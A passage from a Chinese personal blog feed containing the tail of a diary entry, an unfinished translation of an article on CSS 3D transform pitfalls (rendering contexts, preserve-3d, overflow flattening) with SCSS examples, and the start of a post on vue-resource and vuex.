Panic。</p><p>我不想成为一个睡觉打呼噜，体重一百八的人，我不想成为一个休息时候玩线上游戏或看直播度日的人，我不想成为一个怠惰的人，办了健身卡又每天不去。别人做不到的东西，我想做给他看，我想拿出成果来好好打他的脸。我想我就是打心眼里不服，什么看不惯的都不服。</p><p>我又开始咬手了，不自觉的把指尖的角质给咬下来吐掉。我初中的时候也咬手，把每个手指都咬得坑坑洼洼，每次洗完澡泡涨了之后都特别有艺术气息，当时我妈还叫我买口香糖，后来查了查才知道是压力大导致的。或许是我想太多了，以至于周末也不能安心的睡到下午才起床。为什么每天我在闹钟响之前就会自然醒来？我想我的精神也许已经老了。想起姐姐以前还有口吃，这个可能和她左撇子用右手写字有关。</p><p>我想我是青春期到了，或许我就是发育晚一点，这也许也能解释为什么我当时没有典型的叛逆期了。我下巴的痘痘也能证明这一点。</p><blockquote><p>我也要想干什么就干什么，想不干什么就不干什么。<br>但是我是成年人了，要更努力才可以。</p></blockquote><p>以前随笔，现在随键盘。想看就看，不想看别看。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>「译」CSS 3D 注意事项</title>
      <link href="/2016/10-01-things-watch-working-css-3d/"/>
      <url>/2016/10-01-things-watch-working-css-3d/</url>
      
        <content type="html"><![CDATA[<p>这一篇已经有人翻译过了：<a href="http://www.w3cplus.com/css3/things-watch-working-css-3d.html" target="_blank" rel="noopener">CSS 3D 应该注意的事项</a></p><p>原文链接：<a href="https://css-tricks.com/things-watch-working-css-3d/" target="_blank" rel="noopener">Things to Watch Out for When Working with CSS 3D</a> · 作者 <a href="https://css-tricks.com/author/thebabydino/" target="_blank" rel="noopener">ANA TUDOR</a></p><hr><p>我一直挺喜欢 3D 几何。在注意到 CSS 支持得越来越全面的同时，我也开始使用 CSS 3D 变换（transform）。但刚开始就有些东西难住了我：在创建多面体时，我自然地在 3D 中使用 transform 去创建 2D 图形并移动、旋转它们。我想我该记录下我遇见的奇特的部分，希望你能绕过这些障碍。</p><h2 id="3D-渲染上下文"><a href="#3D-渲染上下文" class="headerlink" title="3D 渲染上下文"></a>3D 渲染上下文</h2><p>还记得那晚好奇心驱使我写了一个小小的演示，想看看浏览器如何处理平面的交叉。这个演示包括了两个平面元素：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'plane'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'plane'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>它们大小相同，用绝对定位放在屏幕的中间，为了看到它们又加了个背景：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dim</span>: <span class="number">40vmin</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.plane</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50%</span>; <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">margin</span>: -.<span class="number">5</span>*<span class="variable">$dim</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="variable">$dim</span>; <span class="attribute">height</span>: <span class="variable">$dim</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#ee8c25</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个场景就是整个<code>body</code>元素，让其覆盖整个视窗（viewport），然后给了一个<code>perspective（透视）</code>使得远一点的看起来小一点，近一点的显示的更大：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">  <span class="attribute">perspective</span>: <span class="number">40em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了测试平面相交的效果，第二个平面元素有一个<code>rotateY()</code>变换（transform），和一个不同的背景：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.plane</span><span class="selector-pseudo">:last-child</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">rotateY</span>(60deg);</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#d14730</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果是令人失望的。似乎没有浏览器可以正确的处理平面相交：</p><p></p><p data-height="265" data-theme-id="light" data-slug-hash="ozzWWp" data-default-tab="css,result" data-user="thebabydino" data-embed-version="2" class="codepen">See the Pen <a href="http://codepen.io/thebabydino/pen/ozzWWp/" target="_blank" rel="noopener">test plane intersection (WRONG!)</a> by Ana Tudor (<a href="http://codepen.io/thebabydino" target="_blank" rel="noopener">@thebabydino</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="//assets.codepen.io/assets/embed/ei.js"></script><p>但是我错了。这些代码就应该显示成这个样子。我本应该将这两个平面放在同一个<a href="https://drafts.csswg.org/css-transforms/#3d-rendering-contexts" target="_blank" rel="noopener">3D 渲染上下文</a>中。鉴于有人不熟悉 3D 渲染上下文，简单来说它和<a href="https://philipwalton.com/articles/what-no-one-told-you-about-z-index/" target="_blank" rel="noopener">堆叠上下文</a>差不多。在不同的堆叠上下文中我们不能通过<code>z-index</code>来对元素进行排序，同样的，在不同的 3D 渲染上下文中，3D 变换后的元素不能进行 3D 排序或交叉。</p><p>将元素放在同一个 3D 渲染上下文中的方法也很简单，即放在另一个元素内：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'assembly'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'plane'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'plane'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>   </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后把包裹元素用绝对定位放在场景中间，并为其设置<code>transform-style: preserve-3d</code>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123; <span class="attribute">position</span>: absolute; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.assembly</span> &#123;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>; <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform-style</span>: preserve-<span class="number">3</span>d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就解决了问题：</p><p></p><p data-height="265" data-theme-id="light" data-slug-hash="ZppyYX" data-default-tab="css,result" data-user="thebabydino" data-embed-version="2" class="codepen">See the Pen <a href="http://codepen.io/thebabydino/pen/ZppyYX/" target="_blank" rel="noopener">test plane intersection (CORRECT)</a> by Ana Tudor (<a href="http://codepen.io/thebabydino" target="_blank" rel="noopener">@thebabydino</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="//assets.codepen.io/assets/embed/ei.js"></script><p>由于浏览器的原因，你仍不能在 Firefox 中看到本应正常的平面相交效果。但是你应该能在 Webkit 和 Edge 浏览器中看到。</p><p>你有可能问了，为什么要还加一个包裹元素呢，在上一级元素（上面的例子中的<code>body</code>）里添加<code>transform-style: preserve-3d</code>不是更简单么？好吧，在上面的特例中你确实可以这么做（除了 Firefox，因为 Firefox 在处理 3D 顺序和交叉上有问题）：</p><p></p><p data-height="265" data-theme-id="light" data-slug-hash="BLLkkK" data-default-tab="css,result" data-user="thebabydino" data-embed-version="2" class="codepen">See the Pen <a href="http://codepen.io/thebabydino/pen/BLLkkK/" target="_blank" rel="noopener">test plane intersection (working, BUT…)</a> by Ana Tudor (<a href="http://codepen.io/thebabydino" target="_blank" rel="noopener">@thebabydino</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="//assets.codepen.io/assets/embed/ei.js"></script><p>但是在实际的工作环境中，场景不一定是<code>body</code>，我们也会为场景添加其他属性。这些其他属性则可能会干扰到展示效果。</p><h2 id="破坏-3D-（或造成扁平化）的情况"><a href="#破坏-3D-（或造成扁平化）的情况" class="headerlink" title="破坏 3D （或造成扁平化）的情况"></a>破坏 3D （或造成扁平化）的情况</h2><p>例子场景是页面中的另一个<code>div</code>，有其他元素环绕着它：</p><p></p><p data-height="265" data-theme-id="light" data-slug-hash="NRRgrp" data-default-tab="html,result" data-user="thebabydino" data-embed-version="2" class="codepen">See the Pen <a href="http://codepen.io/thebabydino/pen/NRRgrp/" target="_blank" rel="noopener">two planes in smaller scene #0</a> by Ana Tudor (<a href="http://codepen.io/thebabydino" target="_blank" rel="noopener">@thebabydino</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="//assets.codepen.io/assets/embed/ei.js"></script><p>我为第二个平面添加了一些变换使其更加明显，但在这里它超出了场景。这并不是我想看到的。我希望我既能阅读文字，也能操作控件。</p><h3 id="1）overflow"><a href="#1）overflow" class="headerlink" title="1）overflow"></a>1）overflow</h3><p>我最先想到的就是在场景中使用<code>overflow: hidden</code>。然而在使用之后，它失去了漂亮的 3D 交叉效果：</p><p></p><p data-height="265" data-theme-id="light" data-slug-hash="Zppyqj" data-default-tab="result" data-user="thebabydino" data-embed-version="2" class="codepen">See the Pen <a href="https://codepen.io/thebabydino/pen/Zppyqj/" target="_blank" rel="noopener">two planes in smaller scene #2</a> by Ana Tudor (<a href="http://codepen.io/thebabydino" target="_blank" rel="noopener">@thebabydino</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="//assets.codepen.io/assets/embed/ei.js"></script><p>这是因为给任意元素一个非<code>visible</code>的<code>overflow</code>属性都会强行将这个元素的<code>transform-style</code>设置为<code>flat</code>，即使它们已经被设置为了<code>preserve-3d</code>。所以我要使用元素来包裹他们，虽然多一点代码，却能少一点头疼。</p><p></p><p data-height="265" data-theme-id="light" data-slug-hash="KggqLo" data-default-tab="result" data-user="thebabydino" data-embed-version="2" class="codepen">See the Pen <a href="https://codepen.io/thebabydino/pen/KggqLo/" target="_blank" rel="noopener">two planes in smaller scene #3</a> by Ana Tudor (<a href="http://codepen.io/thebabydino" target="_blank" rel="noopener">@thebabydino</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="//assets.codepen.io/assets/embed/ei.js"></script><p>这就是为什么即使场景没有进行 3D 变换，我也总是将场景放在一个包裹的元素当中。比如下面的例子：</p><p></p><p data-height="265" data-theme-id="light" data-slug-hash="LRkGkR" data-default-tab="result" data-user="thebabydino" data-embed-version="2" data-preview="true" class="codepen">See the Pen <a href="http://codepen.io/thebabydino/pen/LRkGkR/" target="_blank" rel="noopener">blue hex helix candy (pure CSS 3D)</a> by Ana Tudor (<a href="http://codepen.io/thebabydino" target="_blank" rel="noopener">@thebabydino</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="//assets.codepen.io/assets/embed/ei.js"></script><p>每一列旋转的六边形都被放在<code>.helix</code>元素当中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'helix'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'col'</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- all the hexagons inside a column --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- the other columns --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>.helix</code>设置的属性只有两个作用：</p><ol><li>保证整个部件被绝对定位于视窗中心 </li><li>所有列都被放在同一个 3D 渲染上下文中 </li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">transform-style</span>: preserve-<span class="number">3</span>d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.helix</span> &#123; <span class="attribute">top</span>: <span class="number">50%</span>; <span class="attribute">left</span>: <span class="number">50%</span>; &#125;</span><br></pre></td></tr></table></figure><p>这是因为我为场景（例子中的<code>body</code>）设置了<code>overflow: hidden</code>，同时六边形的大小也不由视窗决定，所以我不知道他们会不会向外延伸（产生我不想要的滚动条）。</p><p>我承认我被这个坑了很多次。在这里使用<code>overflow: hidden</code>让溢出的显示不那么明显。</p><p>要是一个元素设置了<code>transform-style: preserve-3d</code>，该属性就会<a href="https://davidwalsh.name/3d-transforms" target="_blank" rel="noopener">告诉浏览器</a>不应该把它（这个设置了<code>transform-style: preserve-3d</code>的元素）的子元素拍扁。所以在相同元素上设置<code>overflow: hidden</code>不会让 3D 元素在场景内被拍扁，也能防止子元素超出父元素平面，这在直觉上看也是合理的。</p><p>但有时一个 3D 变换的子元素还是会变成父元素中的平面。看看下面这个双面卡片的例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'card'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'face'</span>&gt;</span>front<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'face'</span>&gt;</span>back<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里将其绝对居中于场景（例子中的<code>body</code>）里，给卡片和它的面设置相同的外观，为外部卡片设置<code>transform-style: preserve-3d</code>，为两面都设置<code>backface-visibility: hidden</code>，再将后面沿着纵轴转半圈：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dim</span>: <span class="number">40vmin</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">width</span>: <span class="variable">$dim</span>; <span class="attribute">height</span>: <span class="variable">$dim</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.card</span> &#123;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>; <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">margin</span>: -.<span class="number">5</span>*<span class="variable">$dim</span>;</span><br><span class="line">    <span class="attribute">transform-style</span>: preserve-<span class="number">3</span>d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.face</span> &#123;</span><br><span class="line">    <span class="attribute">backface-visibility</span>: hidden;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#ee8c25</span>;</span><br><span class="line"></span><br><span class="line">    &amp;:last-child &#123;</span><br><span class="line">        <span class="attribute">transform</span>: rotateY(.<span class="number">5turn</span>);</span><br><span class="line">        <span class="attribute">background</span>: <span class="number">#d14730</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是demo：</p><p></p><p data-height="265" data-theme-id="light" data-slug-hash="BLLdZO" data-default-tab="css,result" data-user="thebabydino" data-embed-version="2" class="codepen">See the Pen <a href="http://codepen.io/thebabydino/pen/BLLdZO/" target="_blank" rel="noopener">card #0</a> by Ana Tudor (<a href="http://codepen.io/thebabydino" target="_blank" rel="noopener">@thebabydino</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="//assets.codepen.io/assets/embed/ei.js"></script><p>这两面都在父元素的平面内，而后面沿着纵轴旋转了半圈。背面虽然方向和正面相反，但是仍在同一个平面中。现在看来都挺好的。</p><p>假如我不想让面展现为长方形。最简单的方法就是为面设置<code>border-radius: 50%</code>。但是<a href="https://codepen.io/thebabydino/pen/ZppXbb/" target="_blank" rel="noopener">貌似完全没用</a>。</p><p>所以在卡片上设置<code>overflow: hidden</code>：</p><p></p><p data-height="265" data-theme-id="light" data-slug-hash="kkkGPW" data-default-tab="css,result" data-user="thebabydino" data-embed-version="2" class="codepen">See the Pen <a href="http://codepen.io/thebabydino/pen/kkkGPW/" target="_blank" rel="noopener">card #2</a> by Ana Tudor (<a href="http://codepen.io/thebabydino" target="_blank" rel="noopener">@thebabydino</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="//assets.codepen.io/assets/embed/ei.js"></script><p>但是这样破坏了我们的 3D 卡片。既然不能这样做，我们就在面上设置：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.face</span> &#123; <span class="attribute">border-radius</span>: <span class="number">50%</span>; &#125;</span><br></pre></td></tr></table></figure><p></p><p data-height="265" data-theme-id="light" data-slug-hash="YGpPXX" data-default-tab="css,result" data-user="thebabydino" data-embed-version="2" class="codepen">See the Pen <a href="http://codepen.io/thebabydino/pen/YGpPXX/" target="_blank" rel="noopener">card #3</a> by Ana Tudor (<a href="http://codepen.io/thebabydino" target="_blank" rel="noopener">@thebabydino</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="//assets.codepen.io/assets/embed/ei.js"></script><p>在这个例子里，解决问题的方法比造成问题的还要简单。但是如果有另外一个形状，比如正八边形？一个正八边形通常用两个元素（或一个元素及其伪元素）来实现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'octagon'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'inner'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>给它们设置相同的外观，将<code>.inner</code>元素旋转<code>45deg</code>，为了能看得见，给他设置一个背景，然后为<code>.octagon</code>设置<code>overflow: hidden</code>：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dim</span>: <span class="number">65vmin</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span> &#123; <span class="attribute">width</span>: <span class="variable">$dim</span>; <span class="attribute">height</span>: <span class="variable">$dim</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.octagon</span> &#123; <span class="attribute">overflow</span>: hidden; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: rotate(<span class="number">45deg</span>);</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#ee8c25</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果在下面：</p><p></p><p data-height="265" data-theme-id="light" data-slug-hash="KgNwWZ" data-default-tab="css,result" data-user="thebabydino" data-embed-version="2" class="codepen">See the Pen <a href="http://codepen.io/thebabydino/pen/KgNwWZ/" target="_blank" rel="noopener">how to: basic regular octagon (pure CSS)</a> by Ana Tudor (<a href="http://codepen.io/thebabydino" target="_blank" rel="noopener">@thebabydino</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="//assets.codepen.io/assets/embed/ei.js"></script><p>如果我们添点文字的话……</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'octagon'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'inner'</span>&gt;</span>octagon<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://codepen.io/thebabydino/pen/KgNwqB/" target="_blank" rel="noopener">就显示不出来了。</a></p><p>这是因为文字在边缘之外，所以我们将文字变大，用<code>text-align: center</code>让他水平居中，再将它的行高设置为<code>.octagon</code>（或<code>.inner</code>）元素的高度以垂直居中：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">    <span class="attribute">font</span>: <span class="number">10vmin</span>/ #&#123;<span class="variable">$dim</span>&#125; sans-serif;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在看上去就好多了，但是文字随着我们对<code>.inner</code>元素的旋转而旋转了：</p><p></p><p data-height="265" data-theme-id="light" data-slug-hash="ozYgob" data-default-tab="css,result" data-user="thebabydino" data-embed-version="2" class="codepen">See the Pen <a href="http://codepen.io/thebabydino/pen/ozYgob/" target="_blank" rel="noopener">octagon with text #1</a> by Ana Tudor (<a href="http://codepen.io/thebabydino" target="_blank" rel="noopener">@thebabydino</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="//assets.codepen.io/assets/embed/ei.js"></script><p>我们为<code>.octagon</code>元素也设置一个旋转（相同度数，相反方向，即负）来解决这个问题：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.octagon</span> &#123; <span class="attribute">transform</span>: <span class="built_in">rotate</span>(-45deg); &#125;</span><br></pre></td></tr></table></figure><p>这样就是有文字的八边形了！</p><p></p><p data-height="265" data-theme-id="light" data-slug-hash="VKmYQj" data-default-tab="css,result" data-user="thebabydino" data-embed-version="2" class="codepen">See the Pen <a href="http://codepen.io/thebabydino/pen/VKmYQj/" target="_blank" rel="noopener">octagon with text - final!</a> by Ana Tudor (<a href="http://codepen.io/thebabydino" target="_blank" rel="noopener">@thebabydino</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="//assets.codepen.io/assets/embed/ei.js"></script><p>现在来研究一下八边形的卡片。我们不能为卡片本身（卡片是<code>.octagon</code>元素，<code>.inner</code>元素就是面）设置<code>overflow: hidden</code>，这样会破坏 3D 卡片的两个不同面：</p><p></p><p data-height="265" data-theme-id="light" data-slug-hash="qaqdpX" data-default-tab="css,result" data-user="thebabydino" data-embed-version="2" class="codepen">See the Pen <a href="http://codepen.io/thebabydino/pen/qaqdpX/" target="_blank" rel="noopener">card #4</a> by Ana Tudor (<a href="http://codepen.io/thebabydino" target="_blank" rel="noopener">@thebabydino</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="//assets.codepen.io/assets/embed/ei.js"></script><p>所以要让<code>.octagon</code>作为面，然后用伪元素实现<code>.inner</code>元素：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.face</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">transform</span>: rotate(<span class="number">45deg</span>);</span><br><span class="line">    <span class="attribute">backface-visibility</span>: hidden;</span><br><span class="line"></span><br><span class="line">    &amp;:before &#123;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">transform</span>: rotate(-<span class="number">45deg</span>);</span><br><span class="line">        <span class="attribute">background</span>: <span class="number">#ee8c25</span>;</span><br><span class="line">        <span class="attribute">content</span>: <span class="string">'front'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &amp;:last-child &#123;</span><br><span class="line">        <span class="attribute">transform</span>: rotateY(.<span class="number">5turn</span>) rotate(<span class="number">45deg</span>);</span><br><span class="line"></span><br><span class="line">        &amp;:before &#123;</span><br><span class="line">            <span class="attribute">background</span>: <span class="number">#d14730</span>;</span><br><span class="line">            <span class="attribute">content</span>: <span class="string">'back'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是就有了下面的结果：</p><p></p><p data-height="265" data-theme-id="light" data-slug-hash="ALpvgp" data-default-tab="css,result" data-user="thebabydino" data-embed-version="2" class="codepen">See the Pen <a href="http://codepen.io/thebabydino/pen/ALpvgp/" target="_blank" rel="noopener">card #5</a> by Ana Tudor (<a href="http://codepen.io/thebabydino" target="_blank" rel="noopener">@thebabydino</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="//assets.codepen.io/assets/embed/ei.js"></script><h3 id="2）clip-path"><a href="#2）clip-path" class="headerlink" title="2）clip-path"></a>2）clip-path</h3><p>另一个会造成相同问题的属性是<code>clip-path</code></p><h1 id="未完待续，话说有人已经翻译过了我的动力不强劲啊"><a href="#未完待续，话说有人已经翻译过了我的动力不强劲啊" class="headerlink" title="未完待续，话说有人已经翻译过了我的动力不强劲啊~~"></a>未完待续，话说有人已经翻译过了我的动力不强劲啊<del>~</del>~</h1>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>What I Learned Today</title>
      <link href="/2016/09-23-what_i_learned_today/"/>
      <url>/2016/09-23-what_i_learned_today/</url>
      
        <content type="html"><![CDATA[<h2 id="怎样正确使用-vue-resource-vuex"><a href="#怎样正确使用-vue-resource-vuex" class="headerlink" title="怎样正确使用 vue-resource + vuex"></a>怎样<del>正确</del>使用 vue-resource + vuex</h2><p>vue-resource 是一个用于XMLHttpRequest以及JSON操作的插件，其实如果不是对<code>inteceptor</code>有需求，有jQuery就够了。<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 